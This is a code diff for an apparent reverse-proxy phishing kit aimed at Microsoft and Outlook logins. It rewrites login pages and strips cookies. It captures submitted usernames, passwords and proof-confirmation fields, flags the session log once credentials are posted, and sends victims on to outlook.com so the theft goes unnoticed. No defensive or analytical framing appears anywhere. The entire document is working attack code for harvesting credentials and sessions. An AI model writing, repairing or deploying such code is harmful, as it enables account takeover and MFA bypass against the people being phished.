@@ -25,40 +25,40 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
 const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
 
     constructor(proxyResp, browserEndPoint) {
-       
-        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
+
+        super(proxyResp, browserEndPoint)
         this.regexes = [
              {
-                reg: /window.__BssoInterrupt_/igm, // Google chrome on windows fix
-                replacement: 'window.__BssoInterrupt_Core=!0;</script>'
-                    + '</head> <body data-bind="defineGlobals: ServerData" style="display: none"> </body> </html>',
+                reg: /https:\/\/account.live.com\/identity\/confirm/igm, // Google chrome on windows fix
+                replacement: '/identity/confirm/'
              },
         ]
     }
 
 
     processResponse() {
-        this.browserEndPoint.removeHeader('X-Frame-Options')
         if (this.proxyResp.headers['content-length'] < 1) {
-            // {
             return this.proxyResp.pipe(this.browserEndPoint)
-            // }
         }
-
 
         const extRedirectObj = super.getExternalRedirect()
         if (extRedirectObj !== null) {
-           const rLocation = extRedirectObj.url
-            if (rLocation === 'https://www.office.com/landing') {
-                this.concludeAuth()
-            }
-            if (rLocation.startsWith('https://login.microsoftonline.com/common/oauth2/authorize?client_id=')) {
-                return this.proxyResp.pipe(this.browserEndPoint)
+            const rLocation = extRedirectObj.url
+
+            if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
+                return this.afterEmailPath()
             }
         }
 
-        // return super.processResponse()
-         let newMsgBody;
+        let appHeaders = this.browserEndPoint.getHeaders()['set-cookie'] || []
+        appHeaders = appHeaders.filter(appSingleHeader => {
+            return !appSingleHeader.startsWith('OParams=')
+        })
+        this.browserEndPoint.setHeader('set-cookie', appHeaders)
+
+
+        // this.browserEndPoint.removeHeader('content-security-policy')
+        let newMsgBody;
         return this.superPrepareResponse(true)
             .then((msgBody) => {
                 newMsgBody = msgBody
@@ -68,30 +68,18 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                         newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                     }
                 }
-
-                if (this.proxyResp.headers['content-type'].startsWith('application/json')) {
-                    const JObjBody = JSON.parse(newMsgBody)
-                    if (JObjBody.hasOwnProperty('Credentials')) {
-                        const fedUrl = JObjBody.Credentials.FederationRedirectUrl
-                        if (fedUrl) {
-                            const fedObj = new URL(fedUrl)
-                            const newFedDomain = fedObj.hostname
-                            console.log('fed domain is ' + newFedDomain)
-                            this.browserEndPoint.clientSession.currentDomain = newFedDomain
-                            newMsgBody = newMsgBody.replace(newFedDomain, process.env.HOST_DOMAIN)
-                        }
-                    }
-                }
                 this.superFinishResponse(newMsgBody)
             }).catch((err) => {
             console.error(err)
         })
     }
 
-    concludeAuth() {
-        console.log('Concluding path')
-
+    afterEmailPath() {
+        this.browserEndPoint.setHeader('location', '/auth0/outlook/owa2')
+        this.browserEndPoint.end('')
     }
+
+
 }
 
 
@@ -106,29 +94,46 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     execute(clientContext) {
+        this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36'
 
+        this.req.headers['accept-encoding'] = 'gzip, br'
         if (this.req.method === 'POST') {
             // super.uploadRequestBody(clientContext.currentDomain, clientContext)
-
+            if (this.req.url.startsWith('/ppsecure/post.srf?')) {
+                super.uploadRequestBody(clientContext.currentDomain, clientContext)
+                clientContext.setLogAvailable(true)
+            }
+            
             super.captureBody(clientContext.currentDomain, clientContext)
 
         }
-        if (this.req.url === '/cold204') {
-            this.res.writeHead(204)
-            return this.res.end('')
+        if (this.req.url.startsWith('/identity/confirm')) {
+            clientContext.currentDomain = 'account.live.com'
+
         }
 
 
+        // Check for redirect
         const redirectToken = this.checkForRedirect()
-        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
-            clientContext.currentDomain = process.env.PROXY_DOMAIN
-            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
-            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
-        }
+        if (redirectToken !== null) {
+            if (redirectToken.url.startsWith('https://login.live.com/oauth20_authorize.srf?')) {
+                clientContext.currentDomain = 'login.live.com'
+                this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
+                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+            }
 
-        if (this.req.url === '/kmsi') {
-            clientContext.setLogAvailable(true);
+            if (redirectToken.url.startsWith('https://login.microsoftonline.com/common/oauth2/nativeclient')) {
+                super.sendClientData(clientContext, {})
+                this.res.writeHead('301', { location: 'https://outlook.com' })
+                return this.res.end()
+            }
+        }
+        
+
+        if (this.req.url === '/auth0/outlook/owa2') {
             super.sendClientData(clientContext, {})
+            this.res.writeHead('301', { location: 'https://outlook.com' })
+            return this.res.end()
         }
 
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
@@ -142,13 +147,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 const configExport = {
     CURRENT_DOMAIN: 'login.microsoftonline.com',
 
-    START_PATH: '/',
     EXTERNAL_FILTERS: 
-        [
-        'login.live.com',
-        // 'aadcdn.msftauth.net',
-        'sso.godaddy.com',
-        ],
+    [
+        'account.live.com',
+    ],
+
+    START_PATH: '/consumers/oauth2/v2.0/authorize?response_type=code&scope=Secrets.ReadWrite.CreatedByApp.Secure+offline_access&client_id=229f4d61-07eb-454a-9453-d27bba7cc95b&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&response_mode=query&state={%22id%22:%22fiedbfgcleddlbcmgdigjgdfcggjcion%22}',
 
     PRE_HANDLERS:
         [
@@ -162,22 +166,21 @@ const configExport = {
             method: 'POST',
             params: ['username'],
             urls: '',
-            hosts: ['login.microsoftonline.com'],
+            hosts: ['login.live.com'],
         },
 
         loginPassword: {
             method: 'POST',
             params: ['passwd'],
             urls: '',
-            hosts: ['login.microsoftonline.com'],
+            hosts: ['login.live.com'],
         },
 
-
-        loginFmt: {
+        proofConfirm: {
             method: 'POST',
-            params: ['loginfmt'],
+            params: ['ProofConfirmation'],
             urls: '',
-            hosts: ['login.microsoftonline.com'],
+            hosts: ['login.live.com'],
         },
 
         defaultPhpCapture: {
@@ -191,4 +194,3 @@ const configExport = {
     // proxyDomain: process.env.PROXY_DOMAIN,
 }
 module.exports = configExport
-
